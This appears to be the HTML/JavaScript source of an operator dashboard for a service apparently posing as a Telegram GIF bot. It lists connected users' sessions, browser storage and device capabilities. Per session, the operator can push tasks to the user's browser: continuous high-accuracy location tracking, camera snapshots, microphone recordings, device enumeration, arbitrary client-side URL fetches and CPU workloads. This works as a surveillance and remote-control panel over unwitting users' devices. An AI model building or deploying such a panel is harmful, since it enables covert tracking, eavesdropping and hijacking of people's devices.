<!doctype html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>AgentSDK Dashboard</title>
    <style>
        body{font-family:system-ui,Arial,sans-serif;margin:20px}
        h1{margin:0 0 10px}
        .muted{opacity:.7}
        table{width:100%;border-collapse:collapse;margin-top:10px}
        th,td{padding:10px;border-bottom:1px solid #e5e5e5;font-size:14px;vertical-align:middle;text-align:center}
        a.user-link{color:inherit;text-decoration:underline;cursor:pointer}
        tr.details td{background:#fafafa}
        pre{margin:0;padding:12px;border-radius:8px;background:#fff;max-height:360px;overflow:auto;border:1px solid #eee;text-align:left}
        .bar{height:6px;background:#eee;border-radius:4px;overflow:hidden;margin-top:6px}
        .bar > div{height:100%;width:0%;background:#4caf50}
        button.send-btn{padding:6px 10px;border:1px solid #ccc;border-radius:8px;background:#fff;cursor:pointer}
        /* Controls inside Actions cell */
        .controls{display:flex;gap:6px;align-items:center;justify-content:center;flex-wrap:wrap}
        select,input[type="text"],input[type="number"]{padding:6px;border:1px solid #ccc;border-radius:6px;font-size:13px;max-width:260px}
        label{font-size:12px;opacity:.8}
        .cfg{display:none;align-items:center;gap:6px}
        .cfg.active{display:inline-flex}
    </style>
</head>
<body>
<h1>Live Sessions</h1>
<div class="muted">Connected: <span id="conn">…</span></div>
<table>
    <thead>
    <tr>
        <th style="width:40%">User</th>
        <th style="width:20%">Platform</th>
        <th style="width:20%">Last Update</th>
        <th style="width:20%">Actions</th>
    </tr>
    </thead>
    <tbody id="rows"></tbody>
</table>

<script>
    const VER = "dash-2025-08-23-step3";
    console.log("[dash] boot", VER);

    const WS_URL   = "wss://telegram-giphy-bot-9a11b0e83d02.herokuapp.com/ws?role=admin";
    const API_BASE = "https://telegram-giphy-bot-9a11b0e83d02.herokuapp.com";

    const state = new Map(); // sessionId -> {...}
    const rowsEl = document.getElementById('rows');
    const connEl = document.getElementById('conn');

    function usernameFrom(user){ return user ? (user.username || user.first_name || "anonymous") : "anonymous"; }

    function mergeSession(cur, msg) {
        const s = cur || { expanded:false };
        if (msg.sessionId) s.sessionId = msg.sessionId;
        if (msg.appId)     s.appId = msg.appId;
        if (msg.user)      s.user = msg.user;
        if (msg.client)    s.client = msg.client;
        if (msg.browser)   s.browser = msg.browser;
        if (msg.storage)   s.storage = msg.storage;
        if (msg.capabilities) s.capabilities = msg.capabilities;
        s.ts = msg.ts || Date.now();
        return s;
    }

    function escapeHtml(str){ return str.replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c])); }

    function actionsHTML(s){
        const sid = s.sessionId;
        const statusHTML = s.last
            ? `<div class="bar"><div style="width:${Math.min(100, s.last.progress || (s.last.ok === false ? 0 : 100))}%"></div></div>
           <div class="muted">${s.last.type || ''} ${s.last.status ? ('status ' + s.last.status) : ''} ${s.last.ok === false ? 'error' : ''}</div>`
            : '';
        return `
        <div class="controls" data-sid="${sid}">
          <select class="task-kind" data-sid="${sid}">
            <option value="cpu">cpu</option>
            <option value="fetch">fetch</option>
            <option value="info">info</option>
            <option value="location_once">location_once</option>
            <option value="location_watch">location_watch</option>
            <option value="camera_snapshot">camera_snapshot</option>
            <option value="mic_sample">mic_sample</option>
            <option value="enumerate_devices">enumerate_devices</option>
          </select>

          <!-- cpu -->
          <span class="cfg cfg-cpu" data-sid="${sid}">
            <label>N</label>
            <input type="number" class="cpu-n" value="10000" min="1" step="1" data-sid="${sid}">
          </span>

          <!-- fetch -->
          <span class="cfg cfg-fetch" data-sid="${sid}">
            <label>URL</label>
            <input type="text" class="fetch-url" value="https://httpbin.org/get?demo=1" data-sid="${sid}">
            <label>where</label>
            <select class="fetch-where" data-sid="${sid}">
              <option value="client">client</option>
              <option value="auto">auto</option>
              <option value="server">server</option>
            </select>
          </span>

          <!-- location_once -->
          <span class="cfg cfg-location_once" data-sid="${sid}">
            <label>highAccuracy</label>
            <select class="loc-hi" data-sid="${sid}">
              <option value="true" selected>true</option>
              <option value="false">false</option>
            </select>
            <label>timeoutMs</label>
            <input type="number" class="loc-timeout" value="10000" min="1000" step="500" data-sid="${sid}">
          </span>

          <!-- location_watch -->
          <span class="cfg cfg-location_watch" data-sid="${sid}">
            <label>seconds</label>
            <input type="number" class="loc-dur" value="15" min="3" max="120" step="1" data-sid="${sid}">
            <label>highAccuracy</label>
            <select class="loc-hiw" data-sid="${sid}">
              <option value="true" selected>true</option>
              <option value="false">false</option>
            </select>
          </span>

          <!-- camera_snapshot -->
          <span class="cfg cfg-camera_snapshot" data-sid="${sid}">
            <label>facing</label>
            <select class="cam-facing" data-sid="${sid}">
              <option value="user">user</option>
              <option value="environment" selected>environment</option>
            </select>
            <label>maxW</label>
            <input type="number" class="cam-w" value="640" min="64" max="1920" step="16" data-sid="${sid}">
            <label>maxH</label>
            <input type="number" class="cam-h" value="480" min="64" max="1080" step="16" data-sid="${sid}">
            <label>preview</label>
            <select class="cam-prev" data-sid="${sid}">
              <option value="true" selected>true</option>
              <option value="false">false</option>
            </select>
          </span>

          <!-- camera_qr_scan -->
          <span class="cfg cfg-camera_qr_scan" data-sid="${sid}">
            <label>facing</label>
            <select class="qr-facing" data-sid="${sid}">
              <option value="environment" selected>environment</option>
              <option value="user">user</option>
            </select>
            <label>seconds</label>
            <input type="number" class="qr-dur" value="10" min="3" max="30" step="1" data-sid="${sid}">
          </span>

          <!-- mic_sample -->
          <span class="cfg cfg-mic_sample" data-sid="${sid}">
            <label>seconds</label>
            <input type="number" class="mic-dur" value="3" min="1" max="10" step="1" data-sid="${sid}">
          </span>

          <!-- enumerate_devices has no extra config -->

          <button class="send-btn" data-sid="${sid}">Send</button>
        </div>
        ${statusHTML}
      `;
    }

    function render() {
        rowsEl.innerHTML = "";
        const arr = Array.from(state.values()).sort((a,b)=>(b.ts||0)-(a.ts||0));
        console.debug("[dash] render sessions:", arr.map(s=>s.sessionId));

        for (const s of arr) {
            const tr = document.createElement('tr');
            const userLabel = usernameFrom(s.user);

            tr.innerHTML = `
          <td><a class="user-link" data-sid="${s.sessionId}">${userLabel}</a></td>
          <td>${s.client?.platform || "—"}</td>
          <td>${s.ts ? new Date(s.ts).toLocaleTimeString() : "—"}</td>
          <td>${actionsHTML(s)}</td>
        `;
            rowsEl.appendChild(tr);

            if (s.expanded) {
                const det = document.createElement('tr');
                det.className = "details";
                const payload = {
                    sessionId: s.sessionId, appId: s.appId || null,
                    user: s.user || null, client: s.client || null, browser: s.browser || null,
                    storage: s.storage || null, capabilities: s.capabilities || null, ts: s.ts || null
                };
                const logsHTML = (s.logs && s.logs.length)
                    ? `<h3 style="margin:12px 0 6px">Recent Events</h3><pre>${escapeHtml(JSON.stringify(s.logs.slice(0,5), null, 2))}</pre>`
                    : "";
                det.innerHTML = `<td colspan="4"><pre>${escapeHtml(JSON.stringify(payload, null, 2))}</pre>${logsHTML}</td>`;
                rowsEl.appendChild(det);
            }
        }

        // expand/collapse
        rowsEl.querySelectorAll('a.user-link').forEach(a => {
            a.onclick = (e) => {
                const sid = e.currentTarget.getAttribute('data-sid');
                const obj = state.get(sid);
                if (obj) { obj.expanded = !obj.expanded; render(); }
            };
        });

        // wire dropdowns + cfg visibility + send
        rowsEl.querySelectorAll('.controls').forEach(box => {
            const kindSel = box.querySelector('.task-kind');
            const updateCfg = () => {
                const v = kindSel.value;
                box.querySelectorAll('.cfg').forEach(el => el.classList.remove('active'));
                if (v === 'cpu') box.querySelector('.cfg-cpu')?.classList.add('active');
                if (v === 'fetch') box.querySelector('.cfg-fetch')?.classList.add('active');
                if (v === 'location_once') box.querySelector('.cfg-location_once')?.classList.add('active');
                if (v === 'location_watch') box.querySelector('.cfg-location_watch')?.classList.add('active');
                if (v === 'camera_snapshot') box.querySelector('.cfg-camera_snapshot')?.classList.add('active');
                if (v === 'camera_qr_scan') box.querySelector('.cfg-camera_qr_scan')?.classList.add('active');
                if (v === 'mic_sample') box.querySelector('.cfg-mic_sample')?.classList.add('active');
                // enumerate_devices, info have no extra inputs
            };
            kindSel.onchange = updateCfg;
            updateCfg();

            box.querySelector('.send-btn').onclick = async () => {
                const sid = box.getAttribute('data-sid');
                const kind = kindSel.value;
                let payload = {};

                if (kind === 'cpu') {
                    const n = parseInt(box.querySelector('.cpu-n')?.value || '10000', 10);
                    payload = { n: isNaN(n) ? 10000 : n };
                } else if (kind === 'fetch') {
                    const u = box.querySelector('.fetch-url')?.value || '';
                    const where = (box.querySelector('.fetch-where')?.value || 'client').toLowerCase();
                    if (!u) { alert("URL required"); return; }
                    payload = { url: u, where };
                } else if (kind === 'info') {
                    payload = {};
                } else if (kind === 'location_once') {
                    const hi = (box.querySelector('.loc-hi')?.value || 'true') === 'true';
                    const to = parseInt(box.querySelector('.loc-timeout')?.value || '10000', 10);
                    payload = { highAccuracy: hi, timeoutMs: isNaN(to)?10000:to, maximumAgeMs: 0 };
                } else if (kind === 'location_watch') {
                    const dur = parseInt(box.querySelector('.loc-dur')?.value || '15', 10);
                    const hiw = (box.querySelector('.loc-hiw')?.value || 'true') === 'true';
                    payload = { durationSec: isNaN(dur)?15:dur, highAccuracy: hiw, maximumAgeMs: 0 };
                } else if (kind === 'camera_snapshot') {
                    const facing = box.querySelector('.cam-facing')?.value || 'environment';
                    const w = parseInt(box.querySelector('.cam-w')?.value || '640', 10);
                    const h = parseInt(box.querySelector('.cam-h')?.value || '480', 10);
                    const prev = (box.querySelector('.cam-prev')?.value || 'true') === 'true';
                    payload = { facingMode: facing, maxWidth: isNaN(w)?640:w, maxHeight: isNaN(h)?480:h, preview: prev };
                } else if (kind === 'camera_qr_scan') {
                    const facing = box.querySelector('.qr-facing')?.value || 'environment';
                    const dur = parseInt(box.querySelector('.qr-dur')?.value || '10', 10);
                    payload = { facingMode: facing, durationSec: isNaN(dur)?10:dur };
                } else if (kind === 'mic_sample') {
                    const dur = parseInt(box.querySelector('.mic-dur')?.value || '3', 10);
                    payload = { durationSec: isNaN(dur)?3:dur };
                } else if (kind === 'enumerate_devices') {
                    payload = {};
                } else {
                    alert("Unknown task type"); return;
                }

                try {
                    const r = await fetch(`${API_BASE}/tasks`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ sessionId: sid, type: kind, payload })
                    });
                    const j = await r.json().catch(()=>({}));
                    console.log("[dash] /tasks ->", r.status, j);
                    if (!r.ok) alert("enqueue failed");
                } catch (err) {
                    console.error("[dash] /tasks network error", err);
                    alert("network error");
                }
            };
        });
    }

    // --- WS wiring + keep-alive + verbose logs ---
    let ws, pingTimer;
    function connect() {
        console.log("[dash] WS connecting:", WS_URL);
        ws = new WebSocket(WS_URL);

        ws.onopen = () => {
            console.log("[dash] WS open");
            connEl.textContent = "connected";
            clearInterval(pingTimer);
            pingTimer = setInterval(() => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({ type: "admin_ping", ts: Date.now(), ver: VER }));
                    console.debug("[dash] → admin_ping");
                }
            }, 25000);
        };

        ws.onclose = (e) => {
            console.warn("[dash] WS close", e.code, e.reason);
            connEl.textContent = "disconnected — retrying in 3s";
            clearInterval(pingTimer);
            setTimeout(connect, 3000);
        };

        ws.onerror = (e) => {
            console.error("[dash] WS error", e);
            connEl.textContent = "error";
        };

        ws.onmessage = (e) => {
            let msg; try { msg = JSON.parse(e.data) } catch { console.warn("[dash] non-JSON frame", e.data); return; }
            console.debug("[dash] ←", msg.type, msg.sessionId || "");
            if (!msg || !msg.type) return;

            if (msg.type === 'session_join') {
                const cur = state.get(msg.sessionId) || { sessionId: msg.sessionId, expanded:false };
                state.set(msg.sessionId, mergeSession(cur, msg)); render(); return;
            }
            if (msg.type === 'session_leave') {
                state.delete(msg.sessionId); render(); return;
            }
            if (msg.type === 'hello' || msg.type === 'snapshot' || msg.type === 'ping') {
                const sid = msg.sessionId;
                const cur = state.get(sid) || { sessionId: sid, expanded:false };
                state.set(sid, mergeSession(cur, msg)); render(); return;
            }
            if (msg.type === 'task_enqueued') {
                const s = state.get(msg.sessionId) || { sessionId: msg.sessionId, expanded:false };
                s.last = { taskId: msg.taskId, type: msg.taskType, progress: 0 };
                s.logs = s.logs || [];
                s.logs.unshift({ t: new Date(msg.ts).toLocaleTimeString(), payload: msg }); s.logs = s.logs.slice(0,10);
                state.set(msg.sessionId, s); render(); return;
            }
            if (msg.type === 'progress') {
                const s = state.get(msg.sessionId);
                if (s) {
                    s.ts = msg.ts || Date.now();
                    s.last = Object.assign({}, s.last, { progress: msg.progress, type: s.last?.type || 'cpu' });
                    s.logs = s.logs || [];
                    s.logs.unshift({ t: new Date(s.ts).toLocaleTimeString(), payload: msg }); s.logs = s.logs.slice(0,10);
                    render();
                }
                return;
            }
            if (msg.type === 'result') {
                const s = state.get(msg.sessionId);
                if (s) {
                    s.ts = msg.ts || Date.now();
                    s.last = Object.assign({}, s.last, { ok: msg.ok, status: msg.result && msg.result.status });
                    s.logs = s.logs || [];
                    s.logs.unshift({ t: new Date(s.ts).toLocaleTimeString(), payload: msg }); s.logs = s.logs.slice(0,10);
                    render();
                }
                return;
            }
        };
    }
    connect();
</script>
</body>
</html>
